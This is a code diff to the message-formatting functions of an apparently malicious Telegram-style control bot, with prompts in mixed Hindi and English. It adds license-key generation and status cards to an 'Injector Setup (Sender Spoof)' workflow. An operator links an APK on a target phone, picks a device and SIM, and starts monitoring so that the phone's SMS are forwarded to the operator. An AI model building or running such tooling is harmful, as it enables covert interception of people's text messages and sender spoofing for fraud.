@@ -265,8 +265,8 @@ def format_welcome_message() -> str:
         "━━━━━━━━━━━━━━━━━━━━\n"
         "💉 <b>Injector Setup (Sender Spoof)</b>\n"
         "<pre>"
-        "1. /key KEY-XXXX-XXXX-XXXX\n"
-        "   License key (inject)\n"
+        "1. /key generate → nayi key (max 2 devices)\n"
+        "   /key KEY-XXXX-XXXX-XXXX → key set\n"
         "2. /fy &lt;device_id&gt;\n"
         "   Pick device to monitor\n"
         "3. Pick SIM → /addchannel → /startmonitor\n"
@@ -344,30 +344,49 @@ def format_ping_card(latency_ms: int) -> str:
 
 def format_key_error_card() -> str:
     return (
-        "❌ <b>ERROR</b>\n\n"
+        "❌ <b>KEY HELP</b>\n\n"
         "<pre>"
-        "Usage: /key KEY-XXXX-XXXX-XXXX\n"
-        "Example: /key KEY-BQUB-J7LC-EWI1-RW94\n\n"
-        "Or koi bhi Firebase URL:\n"
-        "/key https://your-app.firebaseio.com\n"
-        "/key your-app-default-rtdb.firebaseio.com\n\n"
-        "Empty Firebase bhi chalega — devices baad mein add karo."
+        "/key generate\n"
+        "  → Nayi key (sirf 2 devices)\n\n"
+        "/key KEY-XXXX-XXXX-XXXX\n"
+        "  → Apni key set karo\n\n"
+        "/key status KEY-XXXX...\n"
+        "  → Devices + APK status\n\n"
+        "Firebase URL bhi chalega:\n"
+        "/key https://your-app.firebaseio.com"
+        "</pre>"
+    )
+
+
+def format_key_generated_card(license_key: str) -> str:
+    return (
+        "✅ <b>KEY GENERATED</b>\n\n"
+        "<pre>"
+        f"🔑 {license_key}\n"
+        "📱 Max devices: 2\n"
+        "⏸ Polling: OFF (jab tak /startmonitor na ho)\n\n"
+        "Next:\n"
+        "1. /key " + license_key + "\n"
+        "2. APK mein SAME key + START SERVICE\n"
+        "3. /fy &lt;device_id&gt; → /mynum → /addchannel\n"
+        "4. /startmonitor (tabhi polling ON)"
         "</pre>"
     )
 
 
 def format_key_set_card(inject_key: str) -> str:
     return (
-        "✅ <b>SUCCESS</b>\n\n"
+        "✅ <b>KEY SET</b>\n\n"
         "<pre>"
-        "Inject Key Set!\n\n"
-        f"🔑 Key: {inject_key}\n\n"
-        "APK mein bhi SAME key daalo + START SERVICE\n\n"
+        f"🔑 {inject_key}\n"
+        "📱 Max: 2 devices\n"
+        "⏸ Polling: OFF\n\n"
+        "APK mein SAME key daalo + START SERVICE\n"
+        "(jab tak APK attach na ho, /startmonitor block)\n\n"
         "Next:\n"
         "/fy &lt;device_id&gt; → SIM pick\n"
-        "/mynum &lt;number&gt; → incoming SMS yahan\n"
-        "/addchannel → /startmonitor\n\n"
-        "Polling start → device SMS /mynum par forward"
+        "/mynum &lt;number&gt;\n"
+        "/addchannel → /startmonitor"
         "</pre>"
     )
 
